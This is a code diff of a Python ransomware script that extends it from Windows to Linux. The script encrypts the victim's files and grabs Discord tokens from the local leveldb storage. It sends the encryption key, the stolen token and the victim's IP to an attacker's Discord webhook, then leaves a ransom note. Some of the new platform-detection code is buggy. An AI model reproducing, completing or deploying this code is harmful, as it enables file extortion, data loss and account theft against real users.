@@ -7,7 +7,9 @@ import random
 import json
 from pathlib import Path
 import playsound
+import platform
 
+sys = str(platform.system)
 key = Fernet.generate_key()
 user = str(os.environ["USERNAME"])
 
@@ -35,24 +37,48 @@ def crypt(filename):
         file.write(encrypted_data)
 
 def warn():
-    name = "" #change to your discord name and tag
-    path = "C:\\Users\\" + user + "\\AppData\\Roaming\\Discord\\Local Storage\\leveldb"
-    ip = requests.get('https://api.ipify.org').text
-    url = "" # change to your webhook
-    data = {}
-    data["content"] = "Key Content for " + user + ": " + str(key) + " Discord token: " + str(find_tokens(path))   
-    data["username"] = ip
-    requests.post(url, data=json.dumps(data), headers={"Content-Type": "application/json"})
-    f = open("oof.txt", "w")
-    f.write("Ooops your files are encrypted! Contact " + name + " on discord to get your files back!\nP.S: We also have your token")
-    f.close()
-    subprocess.call(r"notepad oof.txt", shell=False)
+    if sys == "Linux":
+        name = "" #change to your discord name and tag
+        ip = requests.get('https://api.ipify.org').text
+        url = "" #webhook link
+        data = {}
+        data["content"] = "Key Content for " + user + ": " + str(key)
+        data["username"] = ip
+        requests.post(url, data=json.dumps(data), headers={"Content-Type": "application/json"})
+        f = open("oof.txt", "w")
+        f.write("Ooops your files are encrypted! Contact " + name + " on discord to get your files back!")
+        f.close()
+        subprocess.call(r"oof.txt", shell=False)
+    if sys == "Windows":
+        name = "" #change to your discord name and tag
+        path = "C:\\Users\\" + user + "\\AppData\\Roaming\\Discord\\Local Storage\\leveldb"
+        ip = requests.get('https://api.ipify.org').text
+        url = "" #webhook link
+        data = {}
+        data["content"] = "Key Content for " + user + ": " + str(key) + " Discord token: " + str(find_tokens(path))   
+        data["username"] = ip
+        requests.post(url, data=json.dumps(data), headers={"Content-Type": "application/json"})
+        f = open("oof.txt", "w")
+        f.write("Ooops your files are encrypted! Contact " + name + " on discord to get your files back!\nP.S: We also have your token")
+        f.close()
+        subprocess.call(r"notepad oof.txt", shell=False)
 
-def main():
-    path2 = "C:\\Users" + "\\" + user
+def main2():
+    username = subprocess.call("whoami", shell=False)
+    path2 = "/home/" + username 
     my_path = Path(path2)
     for file in my_path.glob("**/*.*"):
         crypt(file)
     warn()
-    
-main()
+
+def main():
+    path1 = "C:\\Users" + "\\" + user + "\\OneDrive\\Desktop\\test"
+    my_path = Path(path1)
+    for file in my_path.glob("**/*.*"):
+        crypt(file)
+    warn()
+
+if sys == "Windows":
+    main()
+if sys == "Linux":
+    main2()
